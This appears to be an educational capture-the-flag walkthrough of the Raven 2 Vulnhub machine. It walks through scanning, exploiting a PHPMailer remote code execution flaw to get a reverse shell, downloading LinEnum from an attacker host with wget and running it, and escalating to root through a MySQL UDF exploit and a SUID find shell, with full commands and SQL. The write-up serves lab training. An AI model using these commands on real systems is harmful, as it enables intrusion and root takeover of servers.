# Educational Handbook on Information Systems Security: An Analysis of Raven 2 (Vulnhub)

## 1. Introduction
This document is a detailed technical guide to solving the **Raven 2** virtual machine (VM), which is distributed through the Vulnhub platform. Raven 2 is classified as a "Beginner/Intermediate" boot2root machine. The objective of the exercise is to capture four (4) digital flags and, ultimately, to fully compromise the system by obtaining superuser (root) privileges.

> - **Source / Download:** [VulnHub — Raven: 2](https://www.vulnhub.com/entry/raven-2,269/)
> - **Writeup in English:** [Hacking Articles — Raven 2: Vulnhub Walkthrough](https://www.hackingarticles.in/raven-2-vulnhub-walkthrough/)
> - **YouTube Video:** [Raven 2 Vulnhub CTF Walkthrough](https://www.youtube.com/watch?v=MvmZj3LncRo)


---

## 2. Network Reconnaissance and Port Scanning

The initial phase of every penetration test requires identifying the target on the local network.

![Network scan with netdiscover](../../05.%20Raven2-CTF/images/image.png)

*Figure 1 — Network scan with `netdiscover`: the host `192.168.1.101` was identified, with MAC vendor "VMware, Inc.".*

Once the target's IP address has been identified (in this scenario, `192.168.1.101`), a detailed scan is performed to discover open ports and running services.

```bash
nmap -A 192.168.1.101
```

![nmap -A scan](../../05.%20Raven2-CTF/images/image-3.png)

*Figure 2 — `nmap -A`: operating system identification, service version detection, and traceroute.*

* `nmap`: The industry-standard tool for network mapping (Network Mapper).
* `-A`: The "Aggressive" option. This is a composite flag that simultaneously enables operating system detection (OS detection), service version detection (Version detection), script scanning (Script scanning), and route tracing (Traceroute).
* `192.168.1.101`: The IP address of the target system.

The scan revealed three open ports: 22 (SSH), 80 (HTTP), and 111 (RPC).

---

## 3. Web Enumeration

Since an HTTP service was found on port 80, the next step is to map the structure of the website.

![Discovery of the Raven Security website](../../05.%20Raven2-CTF/images/image-1.png)

*Figure 3 — Discovery of the Raven Security website on port 80.*

To uncover hidden directories, a dictionary-based (brute-force) technique is used.

```bash
dirb http://192.168.1.101/
```

* `dirb`: A specialized web content scanner. It works by sending a continuous stream of HTTP GET requests built from the words of a predefined wordlist, looking for responses such as 200 OK or 403 Forbidden.
* `http://192.168.1.101/`: The base URI (Uniform Resource Identifier) of the target.

![dirb scan results](../../05.%20Raven2-CTF/images/image-4.png)

*Figure 4 — `dirb` scan results: the `/vendor/` directory (as well as `/wordpress/`) was discovered.*

The scan indicated the existence of the `/vendor` directory. Browsing this directory revealed files of particular interest.

![The /vendor directory](../../05.%20Raven2-CTF/images/image-5.png)

*Figure 5 — The index of `/vendor/`: `PATH`, `VERSION`, `PHPMailerAutoload.php`, `class.phpmailer.php`.*

* **The `PATH` file**: Viewing it revealed the first flag (Flag 1).

![Contents of the PATH file](../../05.%20Raven2-CTF/images/image-6.png)

*Figure 6 — `flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}` inside `/vendor/PATH`.*

* **The `VERSION` file**: It indicated version 5.2.6. Combined with the presence of the `PHPMailerAutoload.php` file, this leads to the conclusion that the system uses the **PHPMailer library, version 5.2.6**.

---

## 4. Initial Access

The PHPMailer 5.2.6 library is known to contain a critical vulnerability that allows Remote Code Execution (RCE).

![Exploit-DB 40974 for PHPMailer](../../05.%20Raven2-CTF/images/image-7.png)

*Figure 7 — Exploit-DB **40974** (CVE-2016-10033): PHPMailer < 5.2.18 Remote Code Execution (Python).*

![Modifying the exploit code](../../05.%20Raven2-CTF/images/image-8.png)

*Figure 8 — Modifying the Python exploit code: `# coding: utf-8`, `target`, `backdoor`, and the IP address for the reverse shell.*

After downloading a suitable Python exploit, several specific modifications are required:
1. Add the encoding declaration: `# coding: utf-8`.
2. Set the target URI (e.g., `/contact.php`).
3. Set the name of the malicious file (backdoor.php).
4. Insert the attacker's IP address in order to establish a reverse connection (reverse shell).

![Running the exploit](../../05.%20Raven2-CTF/images/image-9.png)

*Figure 9 — Running the exploit: "SeNdіNg eViL sHeLL… SpAwnIng eViL sHeLL…" and `ExPloiTeD http://192.168.1.101/contact.php`.*

Next, we must set up the listener and browse to the location of the backdoor, which in our case is rev.php. This is done by starting netcat on port 4444 (the default) and navigating to ip-address/rev.php. If every step has been carried out correctly, we should obtain a shell on the web server.

![Obtaining a reverse shell](../../05.%20Raven2-CTF/images/image-10.png)

*Figure 10 — Obtaining a reverse shell: `nc -lvp 4444` and the incoming connection from the web server.*

A detailed explanation of each element follows:

- Listener: A program running on the attacker's/tester's machine that "listens" on a specific port, waiting for an incoming connection from the target machine.

- Netcat (nc): The tool used to create the listener. It is a well-known networking utility that can read from and write to network connections. Port 4444 is commonly used as the default in many security tools (such as Metasploit).

- Backdoor / rev.php: A file (in this case written in PHP, hence the .php extension) that the attacker has already uploaded to the web server. When someone visits this page (i.e., browses to ip-address/rev.php), the code is executed on the server.

- The Reverse Shell Process: Rather than attempting to connect directly to the server (which is usually blocked by firewalls), the attacker causes the server to connect back to them. First, the attacker sets up Netcat (the listener) on their own machine. Then, they open rev.php in a browser. This file instructs the server to connect to the Netcat listener waiting on port 4444.

- Shell on the web server: If the connection succeeds, Netcat is attached to the server's command line (shell). From that moment on, the user can type commands on their own machine and have them executed directly on the web server's system.

To stabilize the terminal and upgrade it to a fully interactive TTY (Teletype), the following command is executed:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![Upgrading to a full TTY](../../05.%20Raven2-CTF/images/image-11.png)

*Figure 11 — Upgrading the "blind" shell to an interactive TTY and setting `TERM=xterm`.*

* `python -c`: Instructs the Python interpreter to execute the code that follows, supplied as a string (inline command).
* `import pty; pty.spawn("/bin/bash")`: Imports the `pty` library (pseudo-terminal utilities) and calls the `spawn` method to start a new `/bin/bash` shell process attached to a pseudo-terminal. This resolves display and interaction problems in "blind" shells.

Subsequently, using navigation commands (`cd /var/www`), the second flag (Flag 2) was retrieved.

![Retrieving flag2](../../05.%20Raven2-CTF/images/image-12.png)

*Figure 12 — Retrieving the second flag from `/var/www/flag2.txt`.*

---

## 5. Privilege Escalation

### 5.1 System Enumeration
While examining the WordPress directory, the configuration file `wp-config.php` was located. Inspecting it revealed the password of the database root user (`R@v3nSecurity`).

For further analysis of the operating system's internal configuration, the automated script `LinEnum.sh` was used.

```bash
cd /tmp
wget http://192.168.1.109/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh
```

* `cd /tmp`: Changes to the temporary files directory, which is typically writable by unprivileged users.
* `wget http://192.168.1.109/LinEnum.sh`: Downloads the tool from the attacker's server over HTTP (the IP addresses are illustrative).
* `chmod 777 LinEnum.sh`: Changes the file's permissions, granting read, write, and execute (Read/Write/Execute) permissions to all users.
* `./LinEnum.sh`: Executes the script.

### 5.2 Exploiting MySQL UDF (CVE-2016-6662)
In accordance with the principle of least privilege, services such as MySQL should run under their own dedicated, unprivileged user accounts (e.g., a user named mysql). When MySQL runs as root, any action performed by the database engine interacts with the operating system with root-level privileges. If an attacker finds a way to make the database execute system commands or write to files, they immediately gain full control of the server.

The analysis revealed a vulnerability in the MySQL service that allows system commands to be executed as root through the use of dynamic libraries (UDF - User Defined Functions). The exploit code has the identifier `1518.c` on Exploit-DB.

```bash
searchsploit -m 1518.c
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
```

* `searchsploit -m`: Searches for the exploit and copies (mirrors) its source code into the current directory.
* `gcc`: The GNU Compiler Collection.
* `-g`: Generates debugging information.
* `-shared`: Produces a shared object (dynamic library), which is required for loading by MySQL.
* `-Wl,-soname,1518.so`: Passes options to the linker, setting the "logical" name of the library.
* `-o 1518.so`: Specifies the name of the final output file.
* `1518.c`: The source file.
* `-lc`: Links against the standard C library (libc).

Once the compiled `.so` file has been transferred to the target (via `wget`), a connection to MySQL is established:

```bash
mysql -u root -p
```

![Connecting to MySQL](../../05.%20Raven2-CTF/images/image-13.png)

*Figure 13 — Connecting to MySQL as `root` and running `SHOW DATABASES`: the `wordpress` database is present.*

* `mysql`: The database's command-line client.
* `-u root`: Specifies the user (based on the credentials that were discovered).
* `-p`: Prompts for the password (R@v3nSecurity).

Within the SQL environment, the following statements are executed:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/find');
```

1. A temporary table `foo` is created with a column of type `blob` (Binary Large Object) for storing binary data.
2. The binary file `1518.so` is loaded from the `/tmp` directory into the table.
3. The content is exported (`dumpfile`) into MySQL's vulnerable plugins directory.
4. The function `do_system` is created, deriving its functionality (soname) from the library that has just been planted.
5. The `do_system` function is called to execute the command `chmod u+s /usr/bin/find`. This sets the **SUID (Set-User-ID) bit** on the `find` executable, allowing any user to run it with the privileges of the file's owner (i.e., root).

---

## 6. Final Compromise (Root Access) & Flag Retrieval

By exploiting the `find` executable, which now carries the SUID bit, commands are executed as the superuser.

```bash
touch raj
find raj -exec "/bin/sh" \;
```

* `touch raj`: Creates an empty file (or updates its timestamp) named "raj". This is required as a "decoy" so that the `find` command has something to find.
* `find raj`: Invokes the `find` utility to locate the file "raj".
* `-exec "/bin/sh" \;`: For each file found, executes the command that follows. Here, it launches a shell (`/bin/sh`). The `\;` marks the end of the `-exec` argument. Since `find` now runs with root privileges (owing to the SUID bit), the spawned shell inherits these full privileges.

From within this high-privilege environment, Flag 4 was located in the `/root` directory. Finally, Flag 3 was found stored within the WordPress directory structure (`/var/www/html/wp-content/uploads/2018/11`).

---
